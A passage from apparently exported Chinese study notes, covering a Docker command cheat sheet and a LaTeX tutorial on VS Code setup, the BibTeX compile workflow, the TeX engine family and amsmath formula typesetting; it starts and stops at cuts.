    "body": "# 常用命令\n## 镜像（images）\n- `docker pull ubuntu:20.04`：拉取一个镜像\n- `docker images`：列出本地所有镜像\n- `docker image rm ubuntu:20.04` 或 `docker rmi ubuntu:20.04`：删除镜像ubuntu:20.04\n- `docker [container] commit CONTAINER IMAGE_NAME:TAG`：创建某个container的镜像\n- `docker save -o ubuntu_20_04.tar ubuntu:20.04`：将镜像ubuntu:20.04导出到本地文件ubuntu_20_04.tar中\n- `docker load -i ubuntu_20_04.tar`：将镜像ubuntu:20.04从本地文件ubuntu_20_04.tar中加载出来\n\n## 容器(container)\n- `docker [container] create -it ubuntu:20.04`：利用镜像ubuntu:20.04创建一个容器。\n- `docker ps -a`：查看本地的所有容器\n- `docker [container] start CONTAINER`：启动容器\n- `docker [container] stop CONTAINER`：停止容器\n- `docker [container] restart CONTAINER`：重启容器\n- `docker [contaienr] run -itd ubuntu:20.04`：创建并启动一个容器\n- `docker [container] attach CONTAINER`：进入容器\n\t- 先按Ctrl-p，再按Ctrl-q可以挂起容器\n- `docker [container] exec CONTAINER COMMAND`：在容器中执行命令\n- `docker [container] rm CONTAINER`：删除容器\n- `docker container prune`：删除所有已停止的容器\n- `docker export -o xxx.tar CONTAINER`：将容器CONTAINER的镜像导出到本地文件xxx.tar中\n- `docker import xxx.tar image_name:tag`：将本地文件xxx.tar导入成镜像，并将镜像命名为image_name:tag\n- `docker export/import`与`docker save/load`的区别：\n\t- `export/import`会丢弃历史记录和元数据信息，仅保存容器当时的快照状态\n\t- `save/load`会保存完整记录，体积更大\n- `docker top CONTAINER`：查看某个容器内的所有进程\n- `docker stats`：查看所有容器的统计信息，包括CPU、内存、存储、网络等信息\n- `docker cp xxx CONTAINER:xxx` 或 `docker cp CONTAINER:xxx` xxx：在本地和容器间复制文件\n- `docker rename CONTAINER1 CONTAINER2`：重命名容器\n- `docker update CONTAINER --memory 500MB`：修改容器限制"
  },
  {
    "title": "./notes/基础知识/latex/latex.md",
    "body": "# VS Code中使用LaTex\nLaTeX是个性化的排版软件，在现的科研论文写作中应用非常广泛。在MacOS环境下使用LaTeX可以借助Visual Studio Code，进行较简易的配置后即可获得很好的使用体验。\n主要步骤如下所示：\n1. 安装MacTex\nMac 可以用 Homebrew 安装\n```\nbrew install --cask mactex-no-gui\n```\n2. 在VSCode中安装插件： LaTeX Workshop (version 8.7.2), 安装后重启以启用代码。\n3. VS Code插件配置：LaTeX Workshop默认使用pdfLaTeX进行编译，在这种配置方法下会报错。所以我们要改为XeLaTeX编译。 <br>\n修改配置过程如下：Command+Shift+P打开settings.json。<br>\n在中括号内加入：\n```\n  // LaTeX\n// 不在保存的时候自动编译\n  \"latex-workshop.latex.autoBuild.run\": \"never\",\n// 编译工具\n  \"latex-workshop.latex.tools\": [\n      {\n          \"name\": \"xelatex\",\n          \"command\": \"xelatex\",\n          \"args\": [\n              \"-synctex=1\",\n              \"-interaction=nonstopmode\",\n              \"-file-line-error\",\n              \"-pdf\",\n              \"%DOCFILE%\"\n          ]\n      },\n      {\n          \"name\": \"pdflatex\",\n          \"command\": \"pdflatex\",\n          \"args\": [\n              \"-synctex=1\",\n              \"-interaction=nonstopmode\",\n              \"-file-line-error\",\n              \"%DOCFILE%\"\n          ]\n      },\n      {\n          \"name\": \"bibtex\",\n          \"command\": \"bibtex\",\n          \"args\": [\n              \"%DOCFILE%\"\n          ]\n      }\n  ],\n// 编译命令\n  \"latex-workshop.latex.recipes\": [\n      {\n          \"name\": \"xelatex\",\n          \"tools\": [\n              \"xelatex\"\n          ],\n      },\n      {\n          \"name\": \"xelatex*2\",\n          \"tools\": [\n              \"xelatex\",\n              \"xelatex\"\n          ],\n      },\n      {\n          \"name\": \"pdflatex\",\n          \"tools\": [\n              \"pdflatex\"\n          ]\n      },\n      {\n          \"name\": \"xe->bib->xe->xe\",\n          \"tools\": [\n              \"xelatex\",\n              \"bibtex\",\n              \"xelatex\",\n              \"xelatex\"\n          ]\n      },\n      {\n          \"name\": \"pdf->bib->pdf->pdf\",\n          \"tools\": [\n              \"pdflatex\",\n              \"bibtex\",\n              \"pdflatex\",\n              \"pdflatex\"\n          ]\n      }\n  ],\nlatex-workshop.latex.tools 下面的是编译工具，latex-workshop.latex.recipes 下面的是编译命令，可以根据需要自行修改，其中第一个 recipes 是 默认的编译命令。\n```json\n   ｛\n \"latex-workshop.latex.recipes\": [\n      {\n        \"name\": \"xelatex\",\n        \"tools\": [\n          \"xelatex\"\n        ]\n      },\n      {\n        \"name\": \"xe*2\",\n        \"tools\": [\n          \"xelatex\",\n          \"xelatex\"\n        ]\n      },\n      {\n        \"name\": \"xelatex -> bibtex -> xelatex*2\",\n        \"tools\": [\n          \"xelatex\",\n          \"bibtex\",\n          \"xelatex\",\n          \"xelatex\"\n        ]\n      }\n    ],\n    \"latex-workshop.latex.tools\": [\n      {\n        \"name\": \"latexmk\",\n        \"command\": \"latexmk\",\n        \"args\": [\n          \"-synctex=1\",\n          \"-interaction=nonstopmode\",\n          \"-file-line-error\",\n          \"-pdf\",\n          \"%DOC%\"\n        ]\n      },\n      {\n        \"name\": \"xelatex\",\n        \"command\": \"xelatex\",\n        \"args\": [\n          \"-synctex=1\",\n          \"-interaction=nonstopmode\",\n          \"-file-line-error\",\n          \"%DOC%\"\n        ]\n      },\n      {\n        \"name\": \"bibtex\",\n        \"command\": \"bibtex\",\n        \"args\": [\n          \"%DOCFILE%\"\n        ]\n      }\n    ],\n    \"latex-workshop.view.pdf.viewer\": \"tab\"\n｝\n```\n然后就可以进行编译了：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163703.png)\n\n# 使用 BibTeX 生成参考文献列表\nLaTeX 是一些理工专业论文排版的事实标准。既然是论文排版，就不可避免会涉及到参考文献的处理。Oren Patashnik 和 Leslie Lamport 在 1985 年开发的 BibTeX 是在 LaTeX 社区相当流行的参考文献格式化工具。\n\n其实网络上流传的 BibTeX 教程很多，本不用我再来插一句嘴。不过这么多年来，始终有很多朋友会对几个问题反复提问。这让我感到，现有的教程恐怕是不够的。这篇文章尝试将 BibTeX 的基本用法讲解清楚，同时适当地提及一些处理流程，争取在有限的篇幅里，讲清楚 BibTeX 的来龙去脉。\n\n## bst 和 bib 格式简介\nBibTeX 涉及到两种特有的辅助的文件格式：`bst` 和 `bib`。\n\n- bst 是 (B)ibliography (ST)yle 的缩写。顾名思义，和 sty 文件是 style 的缩写一样，bst 文件控制着参考文献列表的格式。在这里说的「格式」，主要指参考文献列表中的编号、排序规则、对人名的处理（是否缩写）、月份的处理（是否缩写）、期刊名称的缩写等。\n- bib 是 BibTeX 定义的「参考文献数据库」。通常，我们会按照 BibTeX 规定的格式，向 bib 文件写入多条文献信息。在实际使用时，我们就可以根据 bib 文件中定义的文献标记（label），从数据库中调取文献信息，继而排版成参考文献列表。\n\n值得注意的是，bib 是一个数据库，其中的内容并不一定等于 LaTeX 排版参考文献列表时的内容。也就是说，如果 bib 数据库中有 10 条文献信息，并不一定说 LaTeX 排版出来的 PDF 文件中，参考文献列表里也一定有 10 条。实际排版出来的参考文献列表中有多少条文献，实际是哪几条，具体由文中使用的 \\cite 命令（以及 \\nocite 命令）指定。如果没有使用 \\cite 命令调取文献信息，那么即使在 bib 文件中定义了文献信息，也不会展现在参考文献列表中。很多人对此误解甚深，于是经常有人问道「为什么我在 bib 文件里写的文献，不出现在参考文献中」之类的问题。\n\n## BibTeX 的工作流程\n介绍中提到，BibTeX 是一个参考文献格式化工具。这个定义，给 BibTeX 的用处做了良好的界定：BibTeX 不是用来排版参考文献的，更不是个排版工具，它只是根据需要，按照（bst 文件规定的）某种格式，将（bib 文件中包含的）参考文献信息，格式化 为 LaTeX 能够使用的列表信息。\n\n清楚了 BibTeX 需要做的事情（用软件工程的话说，就是清楚了 BibTeX 的 API），我们就可以理清 BibTeX 的工作流程。\n\n### 知道需要哪些参考文献信息\n既然 BibTeX 会根据需要 格式化数据，那么首先要解决的问题就是：BibTeX 如何了解此处的「需求」。\n\n对 BibTeX 稍有了解的读者可能知道，运行 BibTeX 的命令行命令是：\n```bash\nbibtex foo.aux # 其中后缀名 .aux 可以省略\n```\n实际上，BibTeX 正是通过读取 aux 文件中的 \\citation{} 标记，来确定用户需要哪些参考文献的。\n\n举个例子，假设用户用 LaTeX 编译了以下代码：\n```latex\n\\documentclass{article}\n\\begin{document}\nbar\\cite{baz}\n\\end{document}\n```\n如果该文件名为 foo.tex，那么就会生成 foo.aux。其内容大约是：\n```latex\n\\relax\n\\citation{baz}\n```\n在这里，\\relax 表示休息一会儿，什么也不做；\\citation 则是由 tex 文件中的 \\cite 命令写入 aux 文件的标记。它说明了：用户需要标记为 baz 的参考文献信息。\n\n当 BibTeX 读入 aux 文件的时候，它就会记录下所有 \\citation 命令中的内容（即文献标记——label），这样就知道了用户需要哪些参考文献信息。\n\n### 了解文献列表格式以及读取文献数据库\n当 BibTeX 清楚了用户需要哪些文献信息，接下来自然应该搞清楚用户想要什么样的格式。而知道了格式之后，就可以从数据库中抽取所需的文献信息，按照格式准备数据。\n\n为了讲清楚这个步骤，我们对上述 LaTeX 代码做些许的修改。\n```latex\n\\documentclass{article}\n\\begin{document}\n\\bibliographystyle{unsrt}\nbar\\cite{baz}\n\\bibliography{foobar}\n\\end{document}\n```\n同样，我们将它保存为 foo.tex，经由 LaTeX 编译之后得到一个 foo.aux 文件，其内容如下：\n```latex\n\\relax\n\\bibstyle{unsrt}\n\\citation{baz}\n\\bibdata{foobar}\n```\n简单的对比，不难发现：\n- foo.tex 中新增的`\\bibliographystyle{unsrt}`与`aux`文件中的`\\bibstyle{unsrt}`相对应。\n- foo.tex 中新增的`\\bibliography{foobar}`与`aux`文件中的`\\bibdata{foobar}`相对应。\n\n根据命令的名字，我们很容易猜测各个命令的作用。tex 文件中的 \\bibliographystyle 指定了用户期待的参考文献列表格式文件，并将其写入 aux 文件备用，通过 \\bibstyle 标记。与此同时，\\bibliography 命令则用 \\bibdata 在 aux 文件中记录了参考文献数据库的名字（不含扩展名）。\n\n在这里，unsrt 是 unsort 的缩写，它对应着 unsrt.bst 文件，是大多数 TeX 发行版自带的标准格式文件之一；foobar 则对应着 foobar.bib 文件，该文件是用户自己编写或生成的参考文献数据库。\n\n### 实际操作看看\n我们假设上述 foobar.bib 文件有如下内容：\n```bibtex\n@BOOK{\n    baz,\n    title = {Dummy Book},\n    publisher = {Egypt},\n    year = {321},\n    author = {The King}\n}\n```\n我们在命令行执行以下操作：\n```bash\nlatex foo.tex   # .tex 可以省略\nbibtex foo.aux  # .aux 可以省略\n```\n我们会发现，BibTeX 生成了两个文件：foo.bbl 和 foo.blg。其中 foo.bbl 的内容如下：\n```bbl\n\\begin{thebibliography}{1}\n\n\\bibitem{baz}\nThe King.\n\\newblock {\\em Dummy Book}.\n\\newblock Egypt, 321.\n\n\\end{thebibliography}\n```\n显然，这就是一个标准的 LaTeX 环境。对 LaTeX 参考文献排版稍有了解的读者可能知道 thebibliography 环境正是 LaTeX 中手工编排参考文献时使用的环境。因此，foo.bbl 就是 BibTeX 格式化输出的结果，LaTeX 只需要将该文件的内容读入，就能在相应的位置输出格式化之后的参考文献列表了。\n\n接下来，我们看看 foo.blg 的内容。blg 实际是 BibTeX Log 的缩写，亦即这是一个日志文件。\n```\nThis is BibTeX, Version 0.99d (TeX Live 2015)\nCapacity: max_strings=35307, hash_size=35307, hash_prime=30011\nThe top-level auxiliary file: foo.aux\nThe style file: unsrt.bst\nDatabase file #1: foobar.bib\nYou've used 1 entry,\n...\n```\n我们看到，BibTeX 打出的日志文件中，记录了读入 aux/bst/bib 文件的情况。特别地，记录了所需的参考文献条目（entry）的数量（此处为 1）。\n\n日志中值得注意的地方是在提到 bib 文件时，使用了 #1 的标记。既然存在 #1，那么合理推测也可以存在 #2。也就是说，BibTeX 可能支持两个或更多的 bib 数据库共同工作。具体如何实现，请读者自己阅读相关资料（手册或 Google 检索）后实验。\n\n紧接着，我们再执行一次 LaTeX：\n```bash\nlatex foo.tex\n```\n首先，来看看 aux 文件会发生什么变化：\n```latex\n\\relax\n\\bibstyle{unsrt}\n\\citation{baz}\n\\bibdata{foobar}\n\\bibcite{baz}{1}\n```\n相比上一次的 foo.aux，在读入 BibTeX 之后，LaTeX 向 aux 文件写入了更多的信息。这里 \\bibcite{baz}{1} 将 baz 这一参考文献标记（label）与参考文献编号（数字 1）绑定起来了。\n\n接下来，我们看看 dvi 文件的内容：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163719.png)\n\n不难发现，由于读入了 foo.bbl 文件，参考文献列表已经正确展现出来了。然而，正文中依然有一个问号。\n\n实际上，LaTeX 需要 aux 文件中的 \\bibcite 命令，将参考文献标记与参考文献编号关联起来，从而在 tex 文件中的 \\cite 命令位置填上正确的参考文献编号。我们注意到，在我们第二次执行 LaTeX 命令编译之前，foo.aux 文件中是没有这些信息的，直到编译完成，这些信息才被正确写入。因此，第二次执行 LaTeX 命令时，LaTeX 还不能填入正确的文献编号，于是就写入了一个问号作为占位符。\n\n解决这个问题的办法也很简单——此时 aux 文件中已经有了需要的信息，再编译一遍就好了。\n```bash\nlatex foo.tex\n```\n如果没有意外，此时的`foo.dvi`文件应该看起来一切正常了。\n\n### 小结\n- BibTeX 是一个参考文献格式化工具，它会根据需要，按照（bst 文件规定的）某种格式，将（bib 文件中包含的）参考文献信息，格式化 为 LaTeX 能够使用的列表信息。\n- 正确使用 BibTeX 处理参考文献，需要先用 (Xe/PDF)LaTeX 编译 tex 文件，生成 aux 辅助文件。\n- 执行 BibTeX 将读入 aux 文件，搞清楚用户需要哪些文献。\n- 紧接着，BibTeX 根据 aux 文件中的内容，找到正确的 bst 和 bib 文件，并将参考文献信息格式化为 LaTeX 的 thebibliography 环境，作为 bbl 文件输出。\n- 第二次执行 (Xe/PDF)LaTeX 将会读入新生成的 bbl 文件，同时更新 aux 文件。\n- 此时，参考文献列表将会正常展示，但是正文中的引用标记显示为问号。\n- 第三次执行 (Xe/PDF)LaTeX 将会读入 bbl 文件和更新过后的 aux 文件。此时，参考文献相关内容都正常显示。\n\n因此，总的来说，想要正确使用 BibTeX 协同 LaTeX 处理参考文献，需要编译四次：\n```bash\n(xe/pdf)latex foo.tex   # 表示使用 latex, pdflatex 或 xelatex 编译，下同\nbibtex foo.aux\n(xe/pdf)latex foo.tex\n(xe/pdf)latex foo.tex\n```\n\n# LaTeX 相关工具网站\n## 查询符号代码\nhttp://detexify.kirelabs.org/classify.html 允许你用鼠标绘制符号的样子，然后为你查询对应的代码和所需的宏包。\n\n## 手写公式识别为 LaTeX 公式代码\n http://webdemo.visionobjects.com/home.html 有多个功能，其中之一就是能将手写的公式识别为 LaTeX 代码。测试表明识别公式效率一般，准确度尚可，对于复杂矩阵几乎无力识别。\n\n## 在线 LaTeX 编译\nmath.sinica 是台湾中央研究院的支持中文的在线编译，支持中文。\n\n## 输入 LaTeX 产生数学公式图片\nhttp://www.codecogs.com/latex/eqneditor.php 以及 http://www.sciweavers.org/free-online-latex-equation-editor\n\n# TeX 家族\n带有 TeX 的词，仅仅是本文就已经提到了 TeX, LaTeX, XeLaTeX。通常中国学生面对不了解意思的一群形近单词，都会有一种「本能的恐惧」（笑~）。因此，「大神们」在为新手介绍 TeX 的时候，如果互相争论 「XXTeX 比 YYTeX 好」或者是「XXTeX 的 YYTeX 如何如何」，往往会蹦出下面这些带有 TeX 的词汇：\nTeX, pdfTeX, XeTeX, LuaTeX, LaTeX, pdfLaTeX, XeLaTeX …\n\n事实上，这部分的内容太过复杂，我自己的了解也实在有限。所以下面这部分的内容也只能是对我了解到的知识的一个概括，甚至可能有些许谬误。所以大家只需要将这部分的内容当做是一个参考就可以了。\n\n## TeX - LaTeX\nTeX 是高德纳（Donald Ervin Knuth，1938年1月10日 --）教授愤世嫉俗追求完美做出来的排版引擎，同时也是该引擎使用的标记语言（Markup Language）的名称。这里所谓的引擎，是指能够实现断行、分页等操作的程序（请注意这并不是定义）；这里的标记语言，是指一种将控制命令和文本结合起来的格式，它的主体是其中的文本而控制命令则实现一些特殊效果（同样请注意这并不是定义）。\n\n> 你可以在这里找到关于 TeX 引擎的具体描述；\n> 你可以在这里找到关于标记语言的具体描述。\n\n而 LaTeX 则是 L. Lamport （1941年2月7日 -- ） 教授开发的基于 TeX 的排版系统。实际上 LaTeX 利用 TeX 的控制命令，定义了许多新的控制命令并封装成一个可执行文件。这个可执行文件会去解释 LaTeX 新定义的命令成为 TeX 的控制命令，并最终交由 TeX 引擎进行排版。\n\n> 实际上，LaTeX 是基于一个叫做 plain TeX 的格式的。plain TeX 是高德纳教授为了方便用户，自己基于原始的 TeX 定义的格式，但实际上 plain TeX 的命令仍然十分晦涩。至于原始的 TeX 直接使用的人就更少了，因此 plain TeX 格式逐渐就成为了 TeX 格式的同义词，尽管他们事实上是不同的。\n\n因此在 TeX - LaTeX 组合中，\n1. 最终进行断行、分页等操作的，是 TeX 引擎；\n2. LaTeX 实际上是一个工具，它将用户按照它的格式编写的文档解释成 TeX 引擎能理解的形式并交付给 TeX 引擎处理，再将最终结果返回给用户。\n\n## pdfTeX - pdfLaTeX\nTeX 系统生成的文件是 dvi 格式，虽然可以用其他程序将其转换为例如 pdf 等更为常见的格式，但是毕竟不方便。\n\n> dvi 格式是为了排版而产生的，它本身并不支持所谓的「交叉引用」，pdfTeX 直接输出 pdf 格式的文档，这也是 pdfTeX 相对 TeX 进步（易用性方面）的地方。\n\n为了解决这个问题，Hàn Thế Thành 博士在他的博士论文中提出了 pdfTeX 这个对 TeX 引擎的扩展。二者最主要的差别就是 pdfTeX 直接输出 pdf 格式文档，而 TeX 引擎则输出 dvi 格式的文档。\n\npdfLaTeX 这个程序的主要工作依旧是将 LaTeX 格式的文档进行解释，不过此次是将解释之后的结果交付给 pdfTeX 引擎处理。\n\n## XeTeX - XeLaTeX\n高德纳教授在实现 TeX 的当初并没有考虑到中日韩等字符的处理，而只支持 ASCII 字符。这并不是说中日韩字符就无法使用 TeX 引擎排版了，事实上 TeX 将每个字符用一个框包括起来（这被称为盒子）然后将一个个的盒子按照一定规则排列起来，因而 TeX 的算法理论上适用于任何字符。ASCII 字符简单理解，就是在半角模式下你的键盘能直接输出的字符。\n\n在 XeTeX 出现之前，为了能让 TeX 系统排版中文，国人曾使用了 天元、CCT、CJK 等手段处理中文。其中 天元和CCT 现在已经基本不用，CJK 因为使用时间长且效果相对较好，现在还有人使用。\n\n不同于 CJK 等方式使用 TeX 和 pdfTeX 这两个不直接支持 Unicode 字符的引擎，XeTeX 引擎直接支持 Unicode 字符。也就是说现在不使用 CJK 也能排版中日韩文的文档了，并且这种方式要比之前的方式更加优秀。\n\nXeLaTeX 和 XeTeX 的关系与 pdfLaTeX 和 pdfTeX 的关系类似，这里不再赘述。\n\n使用 XeTeX 引擎需要使用 UTF-8 编码。\n\n## LuaTeX\nLuaTeX 是正在开发完善的一个 TeX 引擎，相对它的前辈们还相当的不完善，这里不赘述。\n\n## CTeX - MiKTeX - TeX Live\n之前介绍了 TeX, LaTeX, pdfTeX, pdfLaTeX, XeTeX, XeLaTeX, LuaTeX 等，他们都是 TeX 家族的一部分。但是作为一个能够使用的 TeX 系统，仅仅有他们还是不够的。CTeX, MiKTeX, TeX Live 都是被称为「发行」的软件合集。他们包括了上述各种引擎的可执行程序，以及一些文档类、模板、字体文件、辅助程序等等。其中 CTeX 是建立在 MiKTeX 的基础之上的。\n\n## 总结\nTeX - pdfTeX - XeTeX - LuaTeX 都是排版引擎，按照先进程度递增（LuaTeX 尚未完善）。\n\nLaTeX 是一种格式，基于 TeX 格式定义了很多更方便使用的控制命令。上述四个引擎都有对应的程序将 LaTeX 格式解释成引擎能处理的内容。\n\nCTeX, MiKTeX, TeX Live 都是 TeX 的发行，他们是许许多多东西的集合。\n\n# 组织你的文章\n## 作者、标题、日期\n保存并用 XeLaTeX 编译如下文档，查看效果：\n```latex\n\\documentclass[UTF8]{ctexart}\n\\title{你好，world!}\n\\author{Liam}\n\\date{\\today}\n\\begin{document}\n\\maketitle\n你好，world!\n\\end{document}\n```\n在 document 环境中，除了原本的你好，world!，还多了一个控制序列`maketitle`。这个控制序列能将在导言区中定义的标题、作者、日期按照预定的格式展现出来。\n\n## 章节和段落\n保存并用 XeLaTeX 编译如下文档，查看效果：\n```latex\n\\documentclass[UTF8]{ctexart}\n\\title{你好，world!}\n\\author{Liam}\n\\date{\\today}\n\\begin{document}\n\\maketitle\n\\section{你好中国}\n中国在East Asia.\n\\subsection{Hello Beijing}\n北京是capital of China.\n\\subsubsection{Hello Dongcheng District}\n\\paragraph{Tian'anmen Square}\nis in the center of Beijing\n\\subparagraph{Chairman Mao}\nis in the center of 天安门广场。\n\\subsection{Hello 山东}\n\\paragraph{山东大学} is one of the best university in 山东。\n\\end{document}\n```\n在文档类 article/ctexart 中，定义了五个控制序列来调整行文组织结构。他们分别是\n- \\section{·}\n- \\subsection{·}\n- \\subsubsection{·}\n- \\paragraph{·}\n- \\subparagraph{·}\n\n在report/ctexrep中，还有\\chapter{·}；在文档类book/ctexbook中，还定义了\\part{·}。\n\n## 插入目录\n在上一节的文档中，找到 \\maketitle，在它的下面插入控制序列 \\tableofcontents，保存并用 XeLaTeX 编译两次，观察效果：\n```latex\n\\documentclass[UTF8]{ctexart}\n\\title{你好，world!}\n\\author{Liam}\n\\date{\\today}\n\\begin{document}\n\\maketitle\n\\tableofcontents\n\\section{你好中国}\n中国在East Asia.\n\\subsection{Hello Beijing}\n北京是capital of China.\n\\subsubsection{Hello Dongcheng District}\n\\paragraph{Tian'anmen Square}\nis in the center of Beijing\n\\subparagraph{Chairman Mao}\nis in the center of 天安门广场。\n\\subsection{Hello 山东}\n\\paragraph{山东大学} is one of the best university in 山东。\n\\end{document}\n```\n\n# 插入数学公式\n为了使用 AMS-LaTeX 提供的数学功能，我们需要在导言区加载 amsmath 宏包：\n```latex\n\\usepackage{amsmath}\n```\n## 数学模式\nLaTeX 的数学模式有两种：行内模式 (inline) 和行间模式 (display)。前者在正文的行文中，插入数学公式；后者独立排列单独成行，并自动居中。\n在行文中，使用 $ ... $ 可以插入行内公式，使用 \\[ ... \\] 可以插入行间公式，如果需要对行间公式进行编号，则可以使用 equation 环境：\n```latex\n\\begin{equation}\n...\n\\end{equation}\n```\n行内公式也可以使用`\\(...\\)`或者 \\begin{math} ... \\end{math} 来插入，但略显麻烦。\n无编号的行间公式也可以使用`\\begin{displaymath} ... \\end{displaymath}` 或者 `\\begin{equation*} ... \\end{equation*}` 来插入，但略显麻烦。`（equation* 中的 * 表示环境不编号）`\n也有 plainTeX 风格的 $$ ... $$ 来插入不编号的行间公式。但是在 LaTeX 中这样做会改变行文的默认行间距，不推荐。请参考[我的回答](https://www.zhihu.com/question/27589739/answer/37237684)。\n\n## 上下标\n示例代码（请保存后，使用 XeLaTeX 编译，查看效果）：\n```latex\n\\documentclass{article}\n\\usepackage{amsmath}\n\\begin{document}\nEinstein 's $E=mc^2$.\n\n\\[ E=mc^2. \\]\n\n\\begin{equation}\nE=mc^2.\n\\end{equation}\n\\end{document}\n```\n在这里提一下关于公式标点使用的规范。行内公式和行间公式对标点的要求是不同的：行内公式的标点，应该放在数学模式的限定符之外，而行间公式则应该放在数学模式限定符之内。\n\n在数学模式中，需要表示上标，可以使用 ^ 来实现（下标则是`_`）。它默认只作用于之后的一个字符，如果想对连续的几个字符起作用，请将这些字符用花括号 {} 括起来，例如：\n```latex\n\\[ z = r\\cdot e^{2\\pi i}. \\]\n```\n\n## 根式与分式\n根式用 \\sqrt{·} 来表示，分式用 \\frac{·}{·} 来表示（第一个参数为分子，第二个为分母）。\n示例代码（请保存后，使用 XeLaTeX 编译，查看效果）：\n```latex\n\\documentclass{article}\n\\usepackage{amsmath}\n\\begin{document}\n$\\sqrt{x}$, $\\frac{1}{2}$.\n\n\\[ \\sqrt{x}, \\]\n\n\\[ \\frac{1}{2}. \\]\n\\end{document}\n```\n可以发现，在行间公式和行内公式中，分式的输出效果是有差异的。如果要强制行内模式的分式显示为行间模式的大小，可以使用 \\dfrac, 反之可以使用 \\tfrac。\n\n## 运算符\n一些小的运算符，可以在数学模式下直接输入；另一些需要用控制序列生成，如\n```latex\n\\[ \\pm\\; \\times \\; \\div\\; \\cdot\\; \\cap\\; \\cup\\;\n\\geq\\; \\leq\\; \\neq\\; \\approx \\; \\equiv \\]\n```\n连加、连乘、极限、积分等大型运算符分别用 \\sum, \\prod, \\lim, \\int 生成。他们的上下标在行内公式中被压缩，以适应行高。我们可以用 \\limits 和 \\nolimits 来强制显式地指定是否压缩这些上下标。例如：\n```latex\n$ \\sum_{i=1}^n i\\quad \\prod_{i=1}^n $\n$ \\sum\\limits _{i=1}^n i\\quad \\prod\\limits _{i=1}^n $\n\\[ \\lim_{x\\to0}x^2 \\quad \\int_a^b x^2 dx \\]\n\\[ \\lim\\nolimits _{x\\to0}x^2\\quad \\int\\nolimits_a^b x^2 dx \\]\n```\n多重积分可以使用 \\iint, \\iiint, \\iiiint, \\idotsint 等命令输入。\n```latex\n\\[ \\iint\\quad \\iiint\\quad \\iiiint\\quad \\idotsint \\]\n```\n\n## 定界符（括号等）\n各种括号用 (), [],`\\{\\}`, \\langle\\rangle 等命令表示；注意花括号通常用来输入命令和环境的参数，所以在数学公式中它们前面要加 \\。因为 LaTeX 中 | 和 \\| 的应用过于随意，amsmath 宏包推荐用 \\lvert\\rvert 和 \\lVert\\rVert 取而代之。\n\n为了调整这些定界符的大小，amsmath 宏包推荐使用 \\big, \\Big, \\bigg, \\Bigg 等一系列命令放在上述括号前面调整大小。\n\n有时你可能会觉得 amsmath 宏包提供的定界符放大命令不太够用。通常这意味着你的公式太过复杂。此时你应当首先考虑将公式中的部分提出去，以字母符号代替以简化公式。如果你真的想要排版如此复杂的公式，你可以参考我这篇博文。\n```latex\n\\[ \\Biggl(\\biggl(\\Bigl(\\bigl((x)\\bigr)\\Bigr)\\biggr)\\Biggr) \\]\n\\[ \\Biggl[\\biggl[\\Bigl[\\bigl[[x]\\bigr]\\Bigr]\\biggr]\\Biggr] \\]\n\\[ \\Biggl \\{\\biggl \\{\\Bigl \\{\\bigl \\{\\{x\\}\\bigr \\}\\Bigr \\}\\biggr \\}\\Biggr\\} \\]\n\\[ \\Biggl\\langle\\biggl\\langle\\Bigl\\langle\\bigl\\langle\\langle x\n\\rangle\\bigr\\rangle\\Bigr\\rangle\\biggr\\rangle\\Biggr\\rangle \\]\n\\[ \\Biggl\\lvert\\biggl\\lvert\\Bigl\\lvert\\bigl\\lvert\\lvert x\n\\rvert\\bigr\\rvert\\Bigr\\rvert\\biggr\\rvert\\Biggr\\rvert \\]\n\\[ \\Biggl\\lVert\\biggl\\lVert\\Bigl\\lVert\\bigl\\lVert\\lVert x\n\\rVert\\bigr\\rVert\\Bigr\\rVert\\biggr\\rVert\\Biggr\\rVert \\]\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163731.png)\n\n## 省略号\n省略号用 \\dots, \\cdots, \\vdots, \\ddots 等命令表示。\\dots 和 \\cdots 的纵向位置不同，前者一般用于有下标的序列。\n```latex\n\\[ x_1,x_2,\\dots ,x_n\\quad 1,2,\\cdots ,n\\quad\n\\vdots\\quad \\ddots \\]\n```\n\n## 矩阵\namsmath 的 pmatrix, bmatrix, Bmatrix, vmatrix, Vmatrix 等环境可以在矩阵两边加上各种分隔符。\n```latex\n\\[ \\begin{pmatrix} a&b\\\\c&d \\end{pmatrix} \\quad\n\\begin{bmatrix} a&b\\\\c&d \\end{bmatrix} \\quad\n\\begin{Bmatrix} a&b\\\\c&d \\end{Bmatrix} \\quad\n\\begin{vmatrix} a&b\\\\c&d \\end{vmatrix} \\quad\n\\begin{Vmatrix} a&b\\\\c&d \\end{Vmatrix} \\]\n```\n效果图：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163830.png)\n\n使用 smallmatrix 环境，可以生成行内公式的小矩阵。\n```latex\nMarry has a little matrix $ ( \\begin{smallmatrix} a&b\\\\c&d \\end{smallmatrix} ) $.\n```\n效果图：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163853.png)\n\n## 多行公式\n有的公式特别长，我们需要手动为他们换行；有几个公式是一组，我们需要将他们放在一起；还有些类似分段函数，我们需要给它加上一个左边的花括号。\n\n### 长公式\n#### 不对齐\n无须对齐的长公式可以使用 multline 环境。\n```latex\n\\begin{multline}\nx = a+b+c+{} \\\\\nd+e+f+g\n\\end{multline}\n```\n效果：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163903.png)\n\n如果不需要编号，可以使用 `multline*` 环境代替。\n\n#### 对齐\n需要对齐的公式，可以使用 aligned 次环境来实现，它必须包含在数学环境之内。\n```latex\n\\[\\begin{aligned}\nx ={}& a+b+c+{} \\\\\n&d+e+f+g\n\\end{aligned}\\]\n```\n效果图：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163919.png)\n\n### 公式组\n无需对齐的公式组可以使用 gather 环境，需要对齐的公式组可以使用 align 环境。他们都带有编号，如果不需要编号可以使用带星花的版本。\n```latex\n\\begin{gather}\na = b+c+d \\\\\nx = y+z\n\\end{gather}\n\\begin{align}\na &= b+c+d \\\\\nx &= y+z\n\\end{align}\n```\n效果：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163928.png)\n\n请注意，不要使用 eqnarray 环境。\n\n### 分段函数\n分段函数可以用cases次环境来实现，它必须包含在数学环境之内。\n```latex\n\\[ y= \\begin{cases}\n-x,\\quad x\\leq 0 \\\\\nx,\\quad x>0\n\\end{cases} \\]\n```\n效果图：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163939.png)\n\n# 插入图片和表格\n## 图片\n关于 LaTeX 